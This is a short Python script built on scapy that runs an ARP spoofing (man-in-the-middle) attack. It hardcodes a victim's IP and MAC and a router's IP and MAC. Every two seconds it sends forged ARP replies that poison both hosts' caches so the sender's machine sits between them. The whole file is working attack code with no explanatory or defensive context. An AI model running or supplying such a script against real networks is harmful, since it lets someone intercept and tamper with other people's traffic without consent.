from scapy.all import ARP, send
import time
victim_ip = "10.0.0.32"
victim_mac = "8c:c6:81:2d:63:3d"  
router_ip = "10.0.0.138"
router_mac = "b0:1f:47:15:73:58"


def spoof( target, spoofed,mac):
    packet = ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed) # hwsrh is filled by scapy to be my mac add
    send(packet, iface="Ethernet", verbose=False)
    print( f" Spoofing {target} pretending to be {spoofed}")
while True:
    spoof(victim_ip,router_ip,victim_mac)
    spoof(router_ip,victim_ip,router_mac)

    time.sleep(2)
